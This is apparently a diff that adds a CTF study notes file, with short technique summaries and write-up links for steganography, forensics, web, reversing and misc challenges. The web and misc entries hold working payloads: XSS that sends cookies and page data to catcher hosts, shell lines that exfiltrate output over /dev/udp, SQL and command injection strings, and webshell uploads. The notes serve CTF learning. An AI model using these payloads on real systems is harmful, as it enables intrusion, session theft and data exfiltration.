+  |   2: #F5E9E8      66: #A27C58     130: #546473     194: #5982BB
+[...]
+  |  61: #A48A64     125: #675847     189: #4B3A47     253: #000000
+  |  62: #A3BCE1     126: #101627     190: #7CA2CD     254: #000000
+  |  63: #A38C6B     127: #4C6169     191: #594837     255: #000000
+  background 65
+  + image #0 500x645
+We can spot two oddities:
+  - there are quirks in the sorting
+  - a normal gif file would start with #000000 and end with #FFFFFF, and then #000000 padding
+Googling for "gif stegano colourmap" yields the gifshuffle tool. But ./gifshuffle greg.gif outputs binary garbage and -C outputs gibberish as well.
+The tool was probably modified to reverse sort the colormap table. Patch gifshuffle, compile & run to get the flag.
+
+* puzzle - hitcon-ctf-2014
+extract 100 thumbnails from jpg and puzzle them together to see flag
+https://github.com/ctfs/write-ups-2014/tree/master/hitcon-ctf-2014/puzzle
+
+* wiretap - ncn-ctf-2014
+wav file, diff the 2 channels to extract an image file
+https://ctfcrew.org/writeup/91
+
+* find da key - olympic-ctf-2014
+can hide bits in base64
+
+* welcome to forensics - olympic-ctf-2014
+php code with lots of non-ascii trash commented out
+hint was short_open_tags in php is: <?#
+php allows names to be non-ascii so used Xdebug instead of de-obfuscating code
+used z3 to solve operations
+
+* illegal radio - olympic-ctf-2014
+gnu radio / fm radio transmission
+http://blog.dragonsector.pl/2014/02/olympic-ctf-2014-illegal-radio.html
+
+* mp3 me - phd-ctf-quals-2014
+flag in id3 tag, zlib compressed (not an image)
+http://hacktracking.blogspot.com.au/2014/01/phdays-ctf-quals-2k14-mp3-me-1400-points.html
+
+* doge stege - plaid-ctf-2014
+png with 8-bit colormap (typical stegano)
+find flag by changing palette
+https://github.com/ctfs/write-ups-2014/tree/master/plaid-ctf-2014/doge-stege
+
+* cat's eye - ructf-2014-quals
+gif with flag difference between frames
+https://github.com/ctfs/write-ups-2014/tree/master/ructf-2014-quals/stegano-100
+
+* the flag awakens - seccon-ctf-2014
+extract qr code from frames of a video
+https://github.com/ctfs/write-ups-2014/tree/master/seccon-ctf-2014/seccon-wars-the-flag-awakens
+
+* qr - seccon-ctf-2014
+half qr code
+decoding by hand
+https://yous.be/2014/12/07/seccon-ctf-2014-qr-easy-write-up/
+
+* strange - asis-ctf-finals-2015
+big png file, uncompress IDAT to find hex strings, convert to binary, draw black pixel if value is 1
+http://blog.squareroots.de/en/2015/10/asis-ctf-finals-2015-strange/
+
+* qr - backdoor-ctf-2015
+convert qrcode rendered as terminal lines into an image and use qrcode to scan it
+http://capturetheswag.blogspot.com.au/2015/04/backdoor-ctf-2015-qr-challenge-response.html
+
+* you cant see me - breakin-ctf-2016
+image 7 by 200 pixels (i.e. a bar), with only black and red pixels (black=0, red=1)
+https://github.com/objEEdump/breakin/tree/master/you_cant_see_me
+
+* look at these colours - pragyan-ctf-2016
+stripe of greys
+
+* lily.flac - boston-key-party-2016
+ELF encoded file in FLAC audio file
+sox lily.flac lily.raw (to output headerless (raw) audio)
+
+* catvideo - bctf-2016
+every frame was xored with the first frame
+extract frames with ffmpeg -i catvideo.mp4 -r 1/1 output%d.png
+diff (xor) first frame with every other frame: for i in {2..66}; do convert output1.png output$i.png -evaluate-sequence xor xor$i.png; done (flag shows in every xored png)
+diff (xor) frames in pairs: for i in {2..66}; do convert output$((i-1)).png output$i.png -evaluate-sequence xor xor$i.png; done (flag shows in only 2)
+http://veganzombies.org/writeups/2016/03/21/BCtf-catvideo.html
+can also use PIL/ImageChops to easily add/substract/xor 2 frames http://err0r-451.ru/2016-bctf-forensic-catvideo-150-pts/
+
+* midifan - bctf-2016
+had to convert midi to csv with http://www.fourmilab.ch/webtools/midicsv/
+https://gist.github.com/elliptic-shiho/67896be92f3dd8fd485b
+
+* xorpainter - 0ctf-2016
+big csv file, each row contains 4 numbers, first pair always smaller than second pai -> rectangles
+https://github.com/p4-team/ctf/tree/master/2016-03-12-0ctf/xorpainter
+
+* stegano sound - ndh-quals-2016
+spectrogram analysis (can notice background noise)
+braille alphabet
+https://www.asafety.fr/cryptologie/ctf-ndh-2016-quals-write-up-steganalysis-stegano-sound/
+
+* pcapbleeding - ndh-quals-2016
+parse pcap to find private key by trying every prime number that factored the modulus
+https://duksctf.github.io/blog/2016/03/21/Inso2016-pcapbleeding
+
+* moleman - ndh-quals-2016
+recover blurred flag
+https://github.com/sysdream/WriteUps/blob/master/ndhquals2016/Moleman.md
+
+* magic code - google-ctf-2016
+reed-solomon error correction code in alpha pane 0 (crc used by dvd, satellite, qr code)
+use reedsolo python lib with Codec 40,8 to decode
+http://fadec0d3.blogspot.com.au/2016/05/google-ctf-2016-magic-codes-250.html
+
+- matrix - icectf-2016
+qrcode with each line represented as a number
+replace 0s with '#' and 1s with ' ' to get a qrcode image
+provided = [0x00000000, 0xff71fefe, 0x83480082, 0xbb4140ba, 0xbb6848ba, 0xbb4a80ba, 0x83213082, 0xff5556fe, 0xff5556fe, 0x00582e00, 0x576fb9be, 0x707ef09e, 0xe74b41d6, 0xa82c0f16, 0x27a15690, 0x8c643628, 0xbfcbf976, 0x4cd959aa, 0x2f43d73a, 0x5462300a, 0x57290106, 0xb02ace5a, 0xef53f7fc, 0xef53f7fc, 0x00402e36, 0xff01b6a8, 0x83657e3a, 0xbb3b27fa, 0xbb5eaeac, 0xbb1017a0, 0x8362672c, 0xff02a650, 0x00000000]
+for x in provided:
+    print "{0:032b}".format(x).replace('1', ' ').replace('0', '#')
+# }}}
+
+# forensics {{{
+* windows forensics - nuit-du-hack-ctf-qualifications 2014
+pagefile.sys
+
+* curlcore - plaid-ctf-2014
+find SSL master key in coredump and decrypt TLS session with wireshark
+
+* zfs - plaid-ctf-2014
+encrypted disk, found xor key and used to unxor disk
+https://fail0verflow.com/blog/2014/plaidctf2014-for400-zfs.html
+
+* the golden gate - seccon-ctf-2014
+picture of a logical schema (nand gates)
+https://github.com/ctfs/write-ups-2014/tree/master/seccon-ctf-2014/the-golden-gate
+
+* config bin - 32c3-ctf-2015
+cracking firmware 5-char password fast because we know the plaintext magic 3-byte header
+https://github.com/ctfs/write-ups-2015/tree/master/32c3-ctf-2015/forensics/config-bin-150
+
+* broken heart - asis-quals-ctf-2015
+tcpflow or dshell or re-assemble file split in multiple Content-Range responses
+https://github.com/ctfs/write-ups-2015/tree/master/asis-quals-ctf-2015/forensic/broken-heart
+
+* zrypt - asis-quals-ctf-2015
+password protected zip (zip 2.0 encryption)
+you can recover encryption key if you have any of the zipped files (pkcrack https://www.unix-ag.uni-kl.de/~conrad/krypto/pkcrack.html)
+this attack works only if using standard zip 2.0 encryption it wont work against AES encrypted zips
+http://github.com/ctfs/write-ups-2015/tree/master/asis-quals-ctf-2015/forensic/zrypt
+
+* heath street - boston-key-party-2015
+recover deleted file from ext4 filesystem using: extundelete --restore-all
+https://github.com/ctfs/write-ups-2015/tree/master/boston-key-party-2015/school-bus/heath-street
+
+* riverside - boston-key-party-2015
+restore mouse movements from usb pcap
+https://github.com/ctfs/write-ups-2015/tree/master/boston-key-party-2015/school-bus/riverside
+
+* apt incident response - camp-ctf-2015
+vmware memory dump + debian + volatility
+recover deleted file from memory
+https://github.com/ctfs/write-ups-2015/tree/master/camp-ctf-2015/forensics/APT-incident-response-400
+
+* catch me if you can - nullcon-hackim-2016 
+matryoshka compression doll
+https://github.com/ctfs/write-ups-2016/tree/master/nullcon-hackim-2016/forensics/catchmeifyoucan-100
+
+* uagent - su-ctf-2016
+nice use of scapy to extract User-Agent and download file (with parts out of order)
+
+* blocks - su-ctf-2016
+reconstructing a png from sqlite, had to reorder the IDAT chunks
+https://www.xil.se/post/sharifctf-2016-forensics-blocks-arturo182/
+
+* asis-quals-ctf-2016
+TweakPNG windows gui tool to reorder IDAT chunks and easily review the result
+http://lockboxx.blogspot.com.au/2016/05/asis-ctf-2016-quals-writeup-odrrere.html
+
+* memdump - su-ctf-2016
+packed PE use DiE to find packer, then OllyDbg to unpack (or use https://retdec.com/)
+
+* dtmf - internetwache-ctf-2016
+dtmf tones in webm file
+mediainfo to see what contains the webm file
+avconf to extract second track
+multimon-ng to parse DTMF tones
+https://www.xil.se/post/internetwache-2016-crypto-80-arturo182/
+https://0x90r00t.com/2016/02/22/internetwache-ctf-2016-crypto-80-procrastination-write-up/
+
+* invest - ndh-quals-2016
+reconstruct key using a picture of a logical schema (xor gates)
+https://github.com/p4-team/ctf/tree/master/2016-04-01-nuitduhack-quals/invest
+# }}}
+
+# web {{{
+* devilish - 31c3-ctf-2014
+sqli with tricks to bypass waf
+
+* web proxy - codegate-preliminary-2014
+range header
+http://blog.0xdeffbeef.com/2014/02/codegate-ctf-2014-web-proxy-web-200.html
+
+* web400 - confidence-ds-ctf-teaser-2014
+use self-reference in serialized php
+bypass $auth['hmac_t'] === $auth['hmac'] using a self-reference: $auth['hmac_t'] = &$auth['hmac'];
+bypass $row['password'] == $auth['password'] using $auth['password'] = true because var_dump("unknown pw" == true) => bool(true)
+
+* hashes - csaw-ctf-2014
+dom xss
+window.location.hash unsafely passed in jquery's $() results in js being eval'ed
+https://github.com/ctfs/write-ups-2014/tree/master/csaw-ctf-2014/hashes
+
+* web400 - d-ctf-2014
+soffice.bin accepting socket connections on 127.0.0.1:2002, using unoconv to connect to the running process
+https://github.com/ctfs/write-ups-2014/tree/master/d-ctf-2014/web-400
+
+* web400 - defkthon-ctf-2014
+Error: Object Not Found - missing (GET /astro_users/test []) (errcode=404) <= couchdb
+use the _all_docs endpoint 
+https://github.com/ctfs/write-ups-2014/tree/master/defkthon-ctf/web-400
+
+* hotcows dating - hack-lu-ctf-2014
+git folder and xss using html only to bypass csp
+https://github.com/ctfs/write-ups-2014/tree/master/hack-lu-ctf-2014/hotcows-dating
+
+* imageupload - hack-lu-ctf-2014
+upload jpg with sqli in exif tag
+https://github.com/ctfs/write-ups-2014/tree/master/hack-lu-ctf-2014/imageupload
+
+* daltons corporate security safe for business - hack-lu-ctf-2014
+bypass captcha with javascript
+https://github.com/ctfs/write-ups-2014/tree/master/hack-lu-ctf-2014/daltons-corporate-security-safe-for-business
+
+* angrybird - hack-you-2014
+Windows winapi FindFirstFile quirk
+?page=p<< will become p* and include_once will return the first file starting with "p" (e.g. phpinfo.php)
+can also find folders: if a<< returns and empty page instead of Page does not exists, then we guessed the first letter of a directory
+bruteforce to obtain full name
+http://www.pwntester.com/blog/2014/01/15/hackyou2014-web300-write-up/
+
+* PHPwing - hack-you-2014
+using built-in classes to read local file, and fire an xxe to bypass ssrf
+custom session_start class, deserialization to rce
+http://www.pwntester.com/blog/2014/01/17/hackyou2014-web400-write-up/
+
+* snake - hack-you-2014
+X-Forwarded-For:|`echo bHMgLw==|base64 -d`| to create a file that will be run with Perl's <FILE>
+http://www.pwntester.com/blog/2014/01/15/hackyou2014-web200-write-up/
+
+* voting - hack-you-2014
+bypass PHP is_numeric() with hex literal (old php version)
+http://www.pwntester.com/blog/2014/01/15/hackyou2014-web100-write-up/
+
+* easyinf - hitcon-ctf-2014
+stacked sqli and using procedure to not have dots in the query
+id=');set @a=0x53454c45435420...0a;PREPARE st FROM @a;EXECUTE st;SELECT ('
+https://github.com/ctfs/write-ups-2014/tree/master/hitcon-ctf-2014/easyinj
+
+* leenode - hitcon-ctf-2014
+vulnerable jrun server behind apache, double encoding and \ to bypass apache and read /admin/.htaccess
+/.%5cadmin%5c.htaccess%253b.jsp
+https://github.com/ctfs/write-ups-2014/tree/master/hitcon-ctf-2014/leenode
+
+* py4h4sher - hitcon-ctf-2014
+pbkdf2 hmac sha1 collision
+https://github.com/ctfs/write-ups-2014/tree/master/hitcon-ctf-2014/py4h4sher
+
+* pushin cat - hitcon-ctf-2014
+sqli in insert and postgres+H2
+use sqli to insert a second record with admin role and IP 127.0.0.1
+use stack sql to upload webshell with H2 function: CALL CSVWRITE('/var/www/html/ws.php', 'SELECT CHR(60)||...')-- -
+https://github.com/ctfs/write-ups-2014/tree/master/hitcon-ctf-2014/pushin-cat
+
+* xnginx - olympic-ctf-2014
+host header injection + nginx's X-Accel-redirect header to request /flag only accessible from localhost
+http://www.pwntester.com/blog/2014/02/09/olympic-ctf-curling-tasks/
+
+* rpc - olympic-ctf-2014
+rpc json and php magic method names
+http://www.pwntester.com/blog/2014/02/09/olympic-ctf-curling-tasks/
+
+* stand back - phd-ctf-quals-2014
+sqli with aes-ofb encrypted input
+flip one byte until sql syntax error
+we have a byte that when xored with ' gives us the keystream byte
+also since plaintext only uses a restricted set of chars, we can recover keystream bytes with
+for every char in restricted set do char^ciphertext[i] -> Z
+obtain lots of ciphertexts and discards the Zs that arent in any of them
+
+* php_jl - phd-ctf-quals-2014
+turn lfi into rce with race condition on file upload
+read src with ?code=require($_GET["foo"]);&foo=php://filter/convert.base64-encode/resource=index.php
+code=include($_FILES[foo][tmp_name]."|0");include($_POST[p]);include($_POST[p]);...x12 times in total;include($_POST[p]);a:%0Agoto%20a;' -F foo=@test.php -F p=AAAA.. (806 As)
+upload file, make it output tmp_name by triggering a file not found include, fil up output buffer, infinite loop request is killed after 30s timeout
+then exec uploaded php with ?code=;require("/tmp/phplUaO5I");%20return%2042;
+bypass function blacklist with test.php: <?php $file_path="ls -la /home/phd/"; $get_password_hash = 'system'; ?> because index.php does $get_password_hash($file_path) after the eval($_GET['code'])
+http://blogs.tunelko.com/2014/01/27/phdays-2014-quals-php_jl-writeup/
+
+* oracle - phd-ctf-quals-2014
+sqli in oracle, need to use procedure owned by another user because current user unpriviliged
+https://github.com/ctfs/write-ups-2014/tree/master/phdays-iv-quals/oracle
+
+* bronies - plaid-ctf-2014
+xss+xhr to access internal website (without jquery)
+use xss in website1 to redirect victim to our page with a csrf that POSTs to website2 and triggers an error to reflect another xss
+use xhr to add a form that will exfil internal website3 pages
+https://fail0verflow.com/blog/2014/plaidctf2014-web800-bronies.html
+
+* web300 - volga-quals-2014
+EncChar crazy php trick
+http://dvteam.org/writeups/volgactf/quals/2014/web/300/
+HINT: /?e=echo pi
+I should have at least tried /?e=phpinfo
+chars blacklisted ` ' " ( ) etc.
+double quotes are blacklisted but
+$str = <<<EOF
+string content
+EOF;
+is equivalent to 
+$str = "string content"
+
+include DIRECTORY_SEPARATOR.<<<EOF
+etc
+EOF
+.DIRECTORY_SEPARATOR.<<<EOF
+hosts
+EOF
+.printf
+is equivalent to 
+include "/etc/hosts".printf
+
+find flag in index.php with: php://filter/convert.base64-encode/resource=index.php # works even if allow_url_include = off
+<?
+sleep(1);
+$f= $_GET['e'];
+$f = str_replace(array('`','$','*','#',':','\\','"','(',')','>','\'','/','^',';'),'', $f);
+die(@eval("$f();"));
+FLAG?: ...
+
+* web400 - volga-quals-2014
+rce via expression language injection
+curl .../?header=http://attacker/pwn.xtml
+cat pwn.xhtml
+<?xml version='1.0' encoding='UTF-8' ?>
+<!DOCTYPE html>
+<html xmlns="http://www.w3.org/1999/xhtml">
+<body>
+<div id="top"> </div>
+</body>
+</html>
+
+* web500 - volga-quals-2014
+/login?login=log&password=pass => true (https://sqlite.org/lang_keywords.html)
+https://rdot.org/forum/showthread.php?p=35191#post35191
+
+* abitbol - nuit-du-hack-ctf-qualifications 2014
+zoom.php vuln to xss so we send below payload via contact form
+<iframe src="http://abitbol.nuitduhack.com/zoom.php?image=1.jpg><script>document.location="http://ctf.pwntest.com/catcher.php?data="+document.cookie</script>" /> # steal session id
+<iframe src="http://abitbol.nuitduhack.com/zoom.php?image=1.jpg><script>flag = new XMLHttpRequest(); flag.open('GET','/flag.php',false); flag.send(); flag.open('GET','http://ctf.pwntester.com/catcher.php?data='+flag.response); flag.send();</script>" />
+
+* titanoreine - nuit-du-hack-ctf-qualifications 2014
+When uploading a normal jpg image, we can see that the server processes it using GD with the quality 98.
+I assume we need to upload an image of the same quality so that our php code is more likely to survive the processing.
+I used Virtualabs' Nasty bulletproof Jpeg generator to insert php code within a valid jpg image. 
+lfi with prefix in ?lang=fr.php => blah.php/../2.jpg or blah/../../includes/2.jpg => the image is included
+list directory with ?lang=/../../includes/98.jpg&c=var_dump(glob(%22*%22))%3b and read file with echo%20file_get_contents(%22flag%22)%3b or with highlight_file()
+
+* nightly auth - nuit-du-hack-ctf-qualifications 2014
+time-based username enumeration, and then XPATH injection with the password: " or 1=1 "
+https://github.com/ctfs/write-ups-2014/tree/master/nuit-du-hack-ctf-qualifications/nightly-auth
+
+* mtpox - plaid-ctf-2014
+hash length extension
+hash_extender -d ";0:b" -a ";1:b" --secret 8 -s ef16c2bffbcf0b7567217f292f9c2a9a50885e01e002fa34db34c0bb916ed5c3 
+
+* whatscat - plaid-ctf-2014
+sqli in update stmt because of dns ANY request to domain provided by attacker
+https://blog.skullsecurity.org/2014/plaidctf-writeup-for-web-300-whatscat-sql-injection-via-dns
+
+* polygonshifter - plaid-ctf-2014
+blind sqli in login
+username=admin&password=' or 1=1-- => logged in as admin but password is the flag
+username=admin&password=' or (password LIKE 'a%) and 1='1
+
+* dt_vcs - phd-ctf-quals-2014
+xss using callback to contact (Reverse Clickjacking)
+callback=document.body.firstChild.click&contact=javascript:alert(1)
+http://paul-axe.blogspot.com.au/2014/01/phdays-2014-quals-dtvcs-writeup.html
+
+* steve's list - pico-ctf-2014
+hash length extension attack, php unserialization and preg_replace /e
+https://ehsandev.com/pico2014/web_exploitation/steves_list.html
+
+* reeekeeeeee - plaid-ctf-2014
+django website using pickle to serialize cookie
+https://fail0verflow.com/blog/2014/plaidctf2014-web200-reeekeeeeee.html
+
+* irrsa - ructf-2014-quals
+xss in user-agent but httponly, CSP "default-src 'self'" and no outbound
+we can fix the session cookie of the admin on sub paths
+
+* mssngrrr - ructf-2014-quals
+xss via upload gif/js polyglot
+https://github.com/ctfs/write-ups-2014/tree/master/ructf-2014-quals/web-300
+
+* seccon-ctf-2014
+sqlite sqli in insert via heartbleed
+https://github.com/ctfs/write-ups-2014/tree/master/seccon-ctf-2014/bleeding-heartbleed-test-web
+
+* simple login - secuinside-ctf-prequal-2014
+hash length extension with crc32
+
+* kummerkasten - 32c3-ctf-2015
+xss and jquery to retrieve admin pages
+$.post('http://x:1234', {'a': btoa($('body')[0].innerHTML)})
+https://github.com/ctfs/write-ups-2015/tree/master/32c3-ctf-2015/web/kummerkasten-300
+
+* sequence hunt - 32c3-ctf-2015
+timing attack because sleep() blocks further requests
+https://github.com/ctfs/write-ups-2015/tree/master/32c3-ctf-2015/web/sequence-hunt-200
+
+* webchat - bctf-2015
+sqli + xss
+sqli in INSERT and use char() to bypass blacklisted chars [<>...]
+https://github.com/ctfs/write-ups-2015/tree/master/bctf-2015/web/webchat
+
+* torrent_lover - bctf-2015
+shell command injection, use IFS to not have spaces and use tr to replace whitespace
+post_param=http%3A%2F%2Four.ip%2F`IFS=+;a=ls+-l;ta1=tr+'\t'+'?';ta2=tr+'\n'+'?';ta3=tr+'\40'+'?';$a|$ta1|$ta2|$ta3`.php%0aa.torrent
+https://github.com/pwning/public-writeup/blob/master/bctf2015/web_233-torrent_lover/writeup.md
+
+* owltube - codegate-2015
+aes cbc bit flip to change {"u": "x", "pw": "admin"} to {"u":  "x", "u": "admin"}
+https://github.com/smokeleeteveryday/CTF_WRITEUPS/blob/master/2015/CODEGATE/web/owltube/README.md
+
+* mac hacking - confidence-ctf-teaser-2015
+hmac forgery
+because there is a hashing oracle returning `hash(key XOR ourinput)`
+we can forge a valid hmac thourgh a hash length extension attack
+https://github.com/ctfs/write-ups-2015/tree/master/confidence-ctf-teaser-2015/crypto/mac-hacking-150
+
+* can you hit me - ssctf-2016
+angularjs sandbox bypass -> xss
+https://github.com/ctfs/write-ups-2016/tree/master/ssctf-2016/web/can-you-hit-me-200
+
+* legend - ssctf-2016
+nosql blind sqli
+https://github.com/ctfs/write-ups-2016/tree/master/ssctf-2016/web/legend-legend-300
+
+* greenbox - insomnihack-teaser-2016 
+javascript sandbox escape
+
+* signserver - nullcon-hackim-2016
+xmldecoder (object serialized in xml)
+https://github.com/tuvshuud/1up/blob/master/hackim2016/web100.md
+https://www.dailysecurity.fr/write-up-hackim-web100-web400/
+http://developers-club.com/posts/271431/ (zeronights hackquest ctf task "bazaarng")
+
+* unickle - nullcon-hackim-2016
+union sqli + pickle
+https://github.com/ctfs/write-ups-2016/tree/master/nullcon-hackim-2016/web/unickle-200
+
+* smashthestate - nullcon-hackim-2016
+upload archive symbolic link (zip --symlinks)
+https://github.com/ctfs/write-ups-2016/tree/master/nullcon-hackim-2016/web/smashthestate-400
+
+* hqlol - nullcon-hackim-2016
+hql injection
+https://github.com/ctfs/write-ups-2016/tree/master/nullcon-hackim-2016/web/unickle-200
+
+* oldpersian - su-ctf-2016
+break captcha
+http://gnoobz.com/sharif-ctf-2016-web-250-oldpersian.html solving via image compare 100% success and super simple
+
+* bugbounty - boston-key-party-ctf-2016
+bypass csp with
+<link rel="prefetch" href="http://me/">  
+<meta http-equiv="refresh" content="0; url=http://me/i">
+https://github.com/ctfs/write-ups-2016/tree/master/boston-key-party-2016/web/bug-bounty-3
+
+* rand 2 - 0ctf-2016
+recover seed of rand based on sessionid
+https://github.com/p4-team/ctf/tree/master/2016-03-12-0ctf/rand_2
+
+* monkey - 0ctf-2016
+proof of work in Go
+DNS rebinding to bypass CORS
+
+* guestbook - 0ctf-2016
+xss and chrome xss auditor trick
+POST with secret=blah<script>var+debug=false;</script>, xss auditor will detect and block the assignment in the respose
+POST with username=debug to define the var to true
+http://security.szurek.pl/0ctf-2016-guestbook-1-writeup.html
+ssrf to redis to upload files
+trick to bypass disable_function: upload .so and .php with
+https://blog.ka0labs.net/post/33/
+
+* zerodaystore - bctf-2016
+b64decode doesn't "safe decode" (ignores any non-base64 stuff after the base64 string)
+so just had to submit price=1337&sign=YTFiMmMzZDRlNWY2Cg==&price=0 to override price to 0
+ 
+* qaq - bctf-2016
+xss and CORS
+use jquery to exfil responses (without CORS: * we could not read responses due to SOP)
+comment payload: <iframe src="http://our.ip/"/> and index.html:
+<script type="text/javascript" src="https://cdnjs.cloudflare.com/ajax/libs/jquery/1.11.3/jquery.min.js"></script>
+<script type="text/javascript" charset="utf-8">
+jQuery.get( "http://172.17.0.2/", function(data) {
+  jQuery.post("http://our.ip/catcher", { x: data});
+});
+</script>
+
+* homework - bctf-2016
+sqli through xss
+https://www.ibrahim-elsayed.com/?p=214
+
+* bathing and grooming - pwn2win-ctf-2016
+sqli in sqlite, implement MD5 in pure SQL
+https://github.com/epicleet/write-ups-2016/tree/pwn2win-ctf-2016/pwn2win-ctf-2016/web/bathing-and-grooming-400
+
+* facebug - pwn2win-ctf-2016
+server-side template injection in User-Agent
+http://security.szurek.pl/pwn2win-ctf-2016-facebug-writeup.html
+
+* toil33t - ndh-ctf-quals-2016
+aes ecb shuffle blocks to get admin=true
+https://www.asafety.fr/cryptologie/ctf-ndh-2016-quals-write-up-cryptography-toil33t/
+
+* spacesec2 - ndh-ctf-quals-2016
+mysql sqli in limit (can't do a union after order by)
+replace spaces with %0a to bypass waf
+
+* facesec2 - ndh-ctf-quals-2016
+upload a tar archive with x.py file, short window to GET /upload/x.py and exec our code
+https://github.com/hexpresso/WU-2016/tree/master/nuit-du-hack-ctf-quals-2016/webapp/facesec2
+
+* pixelshop - plaid-ctf-2016
+LFI via zip://uploads/blah.png#webshell
+uploaded png was transformed to a zip file by changing its palette (stored in consecutive bytes)
+https://github.com/p4-team/ctf/tree/master/2016-04-15-plaid-ctf/web_pixelshop
+
+* flag storage server - google-ctf-2016
+GQL injection using like
+data={'username': "manager' AND password >= 'CTF{" + password + chr(c) + "' AMD password < 'z"} // for c in range(33, 126)
+http://buer.haus/2016/05/01/google-ctf-web-11-flag-storage-service/
+
+* zippy - confidence-dragonsector-finals-ctf-2016
+use abstract.zip from gynvael coldwind ten thousand traps (http://gynvael.coldwind.pl/?id=523) to upload zip with a .php file not visible by zip tools
+http://security.szurek.pl/confidence-dragonsector-ctf-zippy-web-300-writeup.html
+
+* pentest - asis-ctf-2016
+ssrf in Referer to get the server's real IP from the cdn
+bf redis password and dump ssh key in the webmaster's home
+task inspired from http://antirez.com/news/96
+https://gist.github.com/stypr/30b0a68b69dbf54d20e420e2b415f8ca
+
+# }}}
+
+# reverse {{{
+* robot plans - hack-lu-ctf-2013
+md5s of lock pattern for android (gesture hashes)
+https://thufirhowatt.wordpress.com/hack-lu-ctf-robot-plans-writeup/
+or like in ctfx-2016/iTrash find gesture.key and follow http://resources.infosecinstitute.com/android-forensics-cracking-the-pattern-lock-protection/
+
+* chrono logical - codegate-preliminary-2014
+disable timeout in select with setarch -T
+http://www.blue-lotus.net/2014-02-25-codegate-ctf-quals-2014-chrono-writeup/
+
+* reverve100 - volga-quals-2014
+maze solved with btree algo
+http://singularityctf.blogspot.com.au/2014/03/volgactf-quals-2014-writeup-reverse-100.html
+
+* exploit100 - volga-quals-2014
+password value enumeration
+
+* big momma - nuit-du-hack-ctf-qualifications 2014
+username/password enumeration
+server returns strcmp return value between our input and the correct username
+
+* rubiks cube - internetwache-ctf-2016
+https://www.xil.se/post/internetwache-2016-rev90-rspkt/
+
+* file checker = internetwache-ctf-2016
+great use of angr (https://github.com/angr/angr-doc/blob/master/examples.md)
+https://github.com/ctfs/write-ups-2016/tree/master/internetwache-ctf-2016/reversing/file-checker-60
+
+* peoples square - 0ctf-2016
+attack on aes with 4 rounds instead of 10
+https://github.com/p4-team/ctf/tree/master/2016-03-12-0ctf/peoples_square
+
+* matriochka - ndh-quals-2016
+boot vm on gparted iso to copy mbr to disk, then remote gdb of vmware vm
+https://securite.intrinsec.com/2016/04/03/write-up-nuit-du-hack-2016-ctf-quals-matriochka-step-4/
+
+* three magic - asis-ctf-2016
+rce with {grep,-nrw,.} to leak src and mt_rand bf
+
+* binarycloud - asis-ctf-2016
+php7 opcache and using http://vulnsite.com///upload.php?blacklistedword to bypass parse_url() (returns false)
+
+# }}}
+
+# mobile {{{
+* state of the ART - 0ctf-2016
+reconstruct Dalvik bytecode from OAT binary
+http://reyammer.blogspot.com.au/2016/03/from-android-art-binary-only-to-dex-yes.html
+
+* ill intentions - google-ctf-2016
+send broadcast intent to app, receive reply containing flag
+instead of reversing jni lib, send broadcast using adb and patch app (https://github.com/dpox/ctfs/blob/master/googlectf2016/IllIntentions.md) or write custom app to receive and log reply (https://ctf.rip/googlectf-2016-ill-intentions-mobile-challenge/)
+can also use Xposed hooks (http://blog.squareroots.de/en/2016/05/google-ctf-2016-ill-intentions-mobile/) 
+
+* little bobby - google-ctf-2016
+write apk to exploit blind sqli
+https://github.com/yohanes/write-ups/tree/master/google-ctf/mobile-little-bobby-application
+# }}}
+
+# misc {{{
+* gunslinger - hack-lu-ctf-2014
+restricted bash shell (no alpha chars allowed)
+bypass with encoding cat in octal: $'\143\141\164'
+https://github.com/ctfs/write-ups-2014/tree/master/hack-lu-ctf-2014/gunslinger-joes-private-terminal
+
+* binary karuta - seccon-ctf-2014
+solution by building and training a Naive Bayes Classifier
+https://github.com/ctfs/write-ups-2014/tree/master/seccon-ctf-2014/binary-karuta
+
+* bar codes - internetwache-ctf-2016
+https://github.com/ctfs/write-ups-2016/tree/master/internetwache-ctf-2016/misc/barparty-90
+
+* dark forest - internetwache-ctf-2016
+binary tree
+https://github.com/ctfs/write-ups-2016/tree/master/internetwache-ctf-2016/code/dark-forest-90
+
+* hsab - bctp-2016
+restricted bash shell with no binaries but with ctypes.sh of Taviso (builtins=([0]="callback" [1]="dlcall" etc. in set's output)
+solution alternative: history -r /home/ctf/flag.ray; history
+https://ctf.rip/bctf-2016-hsab-misc-category-challenge/
+https://github.com/QuokkaLight/write-ups/blob/master/bctf-2016/hsab.md (pow in C)
+
+* smartcat3 - insomnihack-ctf-2016
+rce but can't do spaces or some specials
+<(ls>/dev/udp/1.2.3.4/53)
+<({base64,-d,KGVjaG8gIkdpdmUgbWUgYS4uLiI7IHNsZWVwIDI7IGVjaG8gIi4uLiBmbGFnISIpIHwgL3JlYWRfZmxhZyBmbGFn}>/tmp/t.sh
+<({bash,/tmp/t.sh}>/dev/udp/1.2.3.4/53)
+https://github.com/hexpresso/WU-2016/tree/master/insomnihack-ctf-2016/misc/Smartcat3
+https://github.com/p4-team/ctf/tree/master/2016-03-18-insomnihack-final/web_smartcat3 (read_flag in python)
+
+* amazing - volga-ctf-quals-2016
+maze btree
+https://github.com/EspacioTeam/write-ups/blob/master/2016/volga/Amazing/README.md
+
+* yacst2 - volga-ctf-quals-2016
+solved audio captcha with google speach recognition
+https://github.com/p4-team/ctf/tree/master/2016-03-26-volga2016-quals/yacs2
+
+* unblink - sctf-2016
+decode msg from LEDs
+https://0x90r00t.com/2016/04/17/sctf-2016-code-100-unblink-write-up/
+
+* misc robots - insomnihack-ctf-2016
+lisp program, rce by submitting: #.(run-shell-command "ls")
+https://github.com/p4-team/ctf/tree/master/2016-03-18-insomnihack-final/misc_robots
+
+* smartips - insomnihack-ctf-2016
+simple shell command injection but server sends RST, ACK which we need to drop to be able to continue communication
+iptables -A INPUT -p TCP --tcp-flags ALL RST,ACK -s 10.13.39.30 -j DROP
+https://github.com/hexpresso/WU-2016/tree/master/insomnihack-ctf-2016/network/Smartips
+# }}}
